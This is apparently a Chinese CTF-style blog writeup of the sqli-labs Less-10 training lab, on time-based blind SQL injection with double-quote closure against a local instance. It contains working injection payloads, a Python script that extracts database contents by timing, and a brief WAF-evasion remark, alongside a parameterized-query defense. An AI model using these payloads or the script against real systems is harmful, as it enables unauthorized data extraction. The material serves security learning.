---
layout: post
title: sqli-labs - Less-10 时间盲注（双引号）Writeup
platform: sqli-labs
date: 2026-11-10 07:30:00 +0800
categories: CTF
---

sqli-labs - Less-10 时间盲注（双引号）Writeup

一、题目信息

- 平台：sqli-labs（本地搭建）
- 关卡：Less-10 → Blind - Time Based（时间盲注，双引号）
- 地址：`http://127.0.0.1:8080/Less-10/?id=1`
- 题型：Web / SQL 注入
- 考点：**时间盲注，闭合方式换成双引号**

**环境信息**：

```text
PHP 7.3.4（php -S 127.0.0.1:8080 内置服务器）
MySQL 5.7.26（secure_file_priv 已设为空，允许 outfile）
sqli-labs 源码：工作区 sqli-labs/
数据库 security（users 表 8 条数据）
```

**✅ 实测结果**

```text
?id=1                                      → You are in........... (0.03s)
?id=1"                                     → You are in........... (0.03s)  ← 连报错都没有
?id=1" and sleep(3) --+                    → You are in........... (3.02s)  ★ 睡满
?id=1" and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+  → 3.04s  ⇒ 首字符 's'
```

二、题目分析

**① 源码：和 Less-9 一模一样，只是引号换了**

```php
$sql = "SELECT * FROM users WHERE id=\"$id\" LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
echo "You are in...........";     // 真假都输出
```

**② 和 Less-9 的差别只有一处**

| | Less-9 | Less-10 |
|---|---|---|
| 闭合 | `'` | `"` |
| 注入 payload | `?id=1' and ...` | `?id=1" and ...` |
| 原理 | 完全相同 | 完全相同 |

**③ 怎么快速判断用单引号还是双引号**

```text
?id=1'    → 如果报错/页面变化 → 单引号
?id=1"    → 如果报错/页面变化 → 双引号
★ 这关两个都不报错 → 只能靠 sleep 试探：
   ?id=1' and sleep(3) --+  不睡
   ?id=1" and sleep(3) --+  睡了  ⇒ 双引号
```

**★ 这就是盲注最难受的地方：闭合方式也得"盲猜"。**

三、解题步骤

**第一步：盲试闭合方式**

```text
?id=1' and sleep(3) --+    → 0.03 秒（没睡）⇒ 不是单引号
?id=1" and sleep(3) --+    → 3.02 秒（睡了）⇒ 双引号闭合
```

**第二步：条件睡，问第一个字符**

```text
?id=1" and if(ascii(substr(database(),1,1))=115,sleep(3),0) --+
→ 3.04 秒  ⇒ 's'
```

**第三步：脚本（把 Less-9 的 payload 引号换掉即可）**

```python
import requests, time

url = "http://127.0.0.1:8080/Less-10/"
DELAY = 3

def q(cond):
    payload = f'1" and if({cond},sleep({DELAY}),0) --+'
    t0 = time.time()
    requests.get(url, params={"id": payload}, timeout=DELAY + 10)
    return time.time() - t0 >= DELAY * 0.8

def get_str(sql, max_len=64):
    out = ""
    for i in range(1, max_len + 1):
        if not q(f"length(({sql})) >= {i}"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if q(f"ascii(substr(({sql}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo)
        print(out, flush=True)
    return out

print(get_str("select database()"))       # security
```

四、延伸知识

**① 闭合方式的 4 种常见形态**

```text
'          单引号            → Less-1
"          双引号            → Less-10
')         单引号 + 括号      → Less-3
")         双引号 + 括号      → Less-4 / Less-12
```

**② 盲注下怎么快速试闭合**

```text
方法 1：看报错（有报错最快）
方法 2：sleep 试探（没报错时）
方法 3：直接把四种都写进脚本，谁先睡谁就是对的
```

**③ 时间盲注的工程化**

```text
· 每个字符 7 次请求 × 8 字符 = 56 次请求 × 3 秒 ≈ 3 分钟/字段
· 表名 + 字段 + 数据跑完可能几十分钟 → 用二分 + 多线程压缩
· 生产环境慎用大 sleep，容易被 WAF 识别
```

**④ 防御（同 Less-9）**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id=? LIMIT 0,1");
$stmt->execute([$id]);
// 统一响应时间 + 参数化 = 时间盲注失效
```

五、总结

- **本题核心：和 Less-9 完全一样，只是闭合从 `'` 换成 `"`。**

- 三步方法论：

```text
① 盲试闭合：' 和 " 各来一次 sleep(3)，谁睡谁对
② 条件睡：if(ascii(substr(...)), sleep(3), 0)
③ 二分法 + 脚本
```

- **三个必记要点**：

```text
① 盲注里"闭合方式"本身也要盲猜，用 sleep 试探最可靠
② 四种闭合形态：'  "  ')  ")
③ 脚本模板固定，只改引号即可复用
```

- **实测数据**：

```text
?id=1' and sleep(3) --+  → 0.03s（不是单引号）
?id=1" and sleep(3) --+  → 3.02s（是双引号）
条件真 → 3.04s，条件假 → 0.02s
```

**一句话记忆**：

```
┌──────────────────────────────────────────────────────────────┐
│  Less-10 = Less-9 换引号：单引号换成双引号                     │
│                                                              │
│  盲试口诀：                                                   │
│      ?id=1' and sleep(3) --+   不睡                            │
│      ?id=1" and sleep(3) --+   睡了  → 双引号                  │
│                                                              │
│  ★ 盲注里连"用什么引号"都要靠时间试探                          │
└──────────────────────────────────────────────────────────────┘
```
